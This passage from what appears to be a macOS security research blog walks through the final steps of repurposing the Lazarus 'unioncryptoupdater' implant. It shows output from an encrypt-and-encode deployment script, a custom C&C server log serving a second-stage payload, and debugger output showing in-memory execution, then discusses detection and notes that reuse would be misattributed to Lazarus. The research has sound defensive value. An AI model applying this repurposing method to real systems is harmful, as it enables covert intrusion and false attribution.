</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>        <span style="color:#75715e">// insert code here...
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span><span style="color:#75715e"></span>        NSLog(<span style="color:#e6db74">@&#34;Hello, World!&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8</span><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9</span><span>}</span></span></code></pre></div>
<p>After compiling this <code>&quot;Hello World&quot;</code> code into a <code>mach-O</code> binary, we run it thru our python &ldquo;deployment&rdquo; script which encrypts, encodes, and packages it all up:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ python deploy.py 

[+] AES encrypting payload...
[+] Base64 encoding payload...

[+] payload ready for deployment!

$ hexdump -C payload

00000000  45 52 45 52 45 52 45 52  45 52 45 52 45 52 45 52  |ERERERERERERERER|
00000010  45 52 45 52 45 58 73 7a  75 42 33 44 7a 4a 52 6e  |EREREXszuB3DzJRn|
00000020  7a 45 48 66 30 4c 42 4f  4d 66 50 41 37 5a 31 73  |zEHf0LBOMfPA7Z1s|
00000030  4a 7a 50 39 58 78 7a 64  2b 37 4a 34 47 47 50 43  |JzP9Xxzd+7J4GGPC|
00000040  47 52 44 73 68 46 52 2b  4e 32 75 66 61 47 45 42  |GRDshFR+N2ufaGEB|
00000050  6e 46 6e 33 7a 45 43 45  50 52 6f 4e 57 32 63 67  |nFn3zECEPRoNW2cg|
00000060  6f 52 7a 68 42 34 48 57  31 38 4c 42 35 48 48 4d  |oRzhB4HW18LB5HHM|
00000070  53 71 6f 4a 35 74 74 63  77 38 66 63 36 74 75 6d  |SqoJ5ttcw8fc6tum|

</pre>
</div>
<p>Now, we simply modify our custom C&amp;C server to serve up this processed payload when the repurposed malware checks in with our server:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# python server.py

  [+] awaiting connections
  [+] new connection from 192.168.0.2

  ======= POST HEADERS =======
  Host: allyourbase.belong
  ...

  [+] responding with 2nd-stage payload (42264 bytes)

</pre>
</div>
<p>Setting a breakpoint within the <code>memory_exec2</code> function (specifically at <code>0x0000000100006af6</code>, the call into the payload&rsquo;s <code>main</code>/entrypoint), allows us to confirm that our payload has been successfully transmitted to the remote (now repurposed) loader, unpackaged, decoded, and decrypted successfully:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

(lldb) b 0x0000000100006af6
Breakpoint 2: where = unioncryptoupdater`memory_exec2 + 343

...

Process 2866 stopped
* thread #1, stop reason = breakpoint 2.1

unioncryptoupdater`memory_exec2 + 343:
->  0x100006af6 <+343>: callq  *%r8
   
(lldb) x/10i $r8
    0x201800f20: 55                    pushq  %rbp
    0x201800f21: 48 89 e5              movq   %rsp, %rbp
    0x201800f24: 48 83 ec 20           subq   $0x20, %rsp
    0x201800f28: c7 45 fc 00 00 00 00  movl   $0x0, -0x4(%rbp)
    0x201800f2f: 89 7d f8              movl   %edi, -0x8(%rbp)
    0x201800f32: 48 89 75 f0           movq   %rsi, -0x10(%rbp)
    0x201800f36: e8 33 00 00 00        callq  0x201800f6e           
    0x201800f3b: 48 8d 35 c6 00 00 00  leaq   0xc6(%rip), %rsi      ; @"Hello, World!"
    0x201800f42: 48 89 f7              movq   %rsi, %rdi
    0x201800f45: 48 89 45 e8           movq   %rax, -0x18(%rbp)
    0x201800f49: b0 00                 movb   $0x0, %al
    0x201800f4b: e8 12 00 00 00        callq  0x201800f62           ; NSLog

</pre>
</div>
<p>&hellip;and if we continue (<code>c</code>), our 2<sup>nd</sup>-stage payload is successfully executed on the infected system, directly from memory!</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
(lldb) c
Process 2866 resuming
2020-02-17 23:34:30.606876-0800 unioncryptoupdater[2866:213719] Hello, World!

...

$ log show | grep "Hello, World"
2020-02-17 23:34:30.606982-0800 unioncryptoupdater: (core) Hello, World!

</pre>
</div>
<p>Hooray, we&rsquo;re stoked! 🥳</p>
<h3 id="detection">Detection</h3>
<p>Before ending, I want to briefly discuss detection of this threat (either in it&rsquo;s pristine or repurposed state).</p>
<p>First, it&rsquo;s rather trivial to detect the malware&rsquo;s (launch daemon) persistence (e.g. via <a href="https://objective-see.com/products/blockblock.html">BlockBlock</a>):</p>
<p><img src="../images/blog/blog_0x51/blockblock.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

Our firewall <a href="https://objective-see.com/products/lulu.html">LuLu</a> will also detects the unauthorized network traffic to the attacker (or our!) C&amp;C server:</p>
<img src="../images/blog/blog_0x51/lulu.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>And what about detecting the in-memory execution of 2<sup>nd</sup>-stage payloads? Turns out that&rsquo;s a bit tricker (which is one of the reasons why attacker have begun to utilize this technique!).</p>
<p>Good news though (from the detection point of view), the well-known macOS security researcher (and former #OBTS speaker!) <a href="https://twitter.com/rrcyrus">Richie Cyrus</a> recently published a <a href="https://posts.specterops.io/detection-engineering-using-apples-endpoint-security-framework-affdbcb18b02">blog post</a> that included a section titled: &ldquo;Using ESF to Detect In-Memory Execution&rdquo;</p>
<center>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">For the past few months, I&#39;ve been diving into Apple&#39;s Endpoint Security Framework. This post shares how I use the framework for detection engineering purposes. <a href="https://t.co/jhTnxXYlAS">https://t.co/jhTnxXYlAS</a> <a href="https://t.co/PEpNy4v7jV">pic.twitter.com/PEpNy4v7jV</a></p>&mdash; Richie Cyrus (@rrcyrus) <a href="https://twitter.com/rrcyrus/status/1222906150125035520?ref_src=twsrc%5Etfw">January 30, 2020</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center>
<p>In his, post he notes that via Apple&rsquo;s new Endpoint Security Framework (ESF), we can track various events, such as memory mappings (<code>ES_EVENT_TYPE_NOTIFY_MMAP</code>) which (when combined with other observable events delivered by the ESF) may be used to detect the execution of an in-memory payload:</p>
<blockquote>
"Of the event types, ES_EVENT_TYPE_NOTIFY_MMAP stands out as there was a call to mmap in the PoC code which generated the Calculator execution..."
</blockquote>
<p>Unfortunately, without a kernel extension (which Apple is rapidly deprecating), as far as I know, there is no way to dump a process&rsquo;s memory contents. Thus even if we are to detect that a 2<sup>nd</sup>-stage payload is executing from memory, we won&rsquo;t be to capture the payload (i.e. dump it from memory). Apple, a little help here!?</p>
<p>For more on the topic of memory forensics on macOS, check out the following (insightful!) thread:</p>
<center>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Memory scanning capabilities on macOS are pretty bad in general. But this abolition of kexts for macOS will definitely make it impossible to access the memory if no access to kernel mode will be possible. <a href="https://t.co/TbBHOsnG55">https://t.co/TbBHOsnG55</a></p>&mdash; Matt Suiche (@msuiche) <a href="https://twitter.com/msuiche/status/1226390783768637440?ref_src=twsrc%5Etfw">February 9, 2020</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center>
<h3 id="conclusion">Conclusion</h3>
<p>Lazarus group proves yet again to be a well-resourced, persistent threat, that continues to target macOS users with ever evolving capabilities.
&hellip;so why not repurpose their malware for our own surreptitious purposes!?</p>
<p>Traditionally, repurposed malware has only been leveraged by sophisticated cyber adversaries:</p>
<img src="../images/blog/blog_0x54/others.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>However in this blog post, we illustrated exactly how to &ldquo;recycle&rdquo; Lazarus latest implant, <code>unioncryptoupdater</code>, in a few, fairly straightforward steps.</p>
<p>Specifically, after reversing the sample to uncover its encryption key and encoding mechanism, we built a simple C&amp;C server capable to speaking the malware&rsquo;s protocol. And after overwriting the embedded address of the attacker&rsquo;s C&amp;C server in the malware&rsquo;s binary, with our own, the repurposing was wholly complete.</p>
<p>End result? An advanced persistent 1<sup>st</sup>-stage implant implant, capable of executing <strong>our</strong> 2<sup>nd</sup>-stage payloads, directly from memory! And besides not having to write a single line of &ldquo;client-side&rdquo; code, if our repurposed creation is ever discovered it will surely be (mis)attributed back to the Lazarus group. <em>Win-freaking-Win!?</em></p>
<p>&hellip;and no, Catalina&rsquo;s notarization requirements, <a href="https://objectivebythesea.com/v3/content.html#pWardle">will not thwart</a> our &ldquo;repurposed&rdquo; creations! 🤭</p>
<div class="note">
<center>
❤️ Love these blog posts and/or want to support my research and tools? 
<p>You can support them via my <a href="https://www.patreon.com/bePatron?c=701171">Patreon</a> page!</p>
</center></div>
</section>

    </div>

    
<script src="/js/cookies.js"></script>
<script src="/social/ss-social.js"></script>
<link href="/social/ss-social.css" rel="stylesheet" />

<script> 
    $(function(){
        
        
        
        if("" == getCookie("acceptedCookies")) 
        {
            console.log('ok showing!')

            document.getElementById("cookies").style.display = "block";
        }

    });
</script>

<script>
function acceptCookies() {

    
    setCookie("acceptedCookies", "yes", 365);

    
    document.getElementById("cookies").style.display = "none";
}
</script>

<br>
<br>
<div id="cookies" class="cookie" style="padding-left:20px;">
    This website uses cookies to improve your experience.
    <div class="cookieButton">
        
        <button class="menuicon button-4" role="button" onclick="acceptCookies()" style="margin-top: 12px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Okay!</button>
    </div>
</div>
<nav role="footer">
<ul>

    <li>
        <a href="mailto:contact@objective-see.com" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#x2709;</span></a>
    </li>

     <li>
        <a href="rss.xml" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xE310;</span></a>
    </li>

    <li>
        <a href="https://www.youtube.com/channel/UCQycc8VDhHuNkZlKSSTDHzw" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xF630;</span></a>
    </li>
   
    <li>
        <a href="https://twitter.com/objective_see" class="menubutton icon"><span class="ss-icon">&#xF611;</span></a>
    </li>
    
    <li>
         <form action="support.html" style="display: inline;">
            <button class="menuicon button-4" role="button" style="margin-top: 7px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Support Us!</button>
        </form>
        
    </li>

    <li>
        <div style="margin-top: 10px;">
        Signup for our <a class="inlineLink" target="_blank" href="http://eepurl.com/bXpXeT">newsletter </a> »
        </div>
    </li>

</ul>
</nav>

  </body>
</html>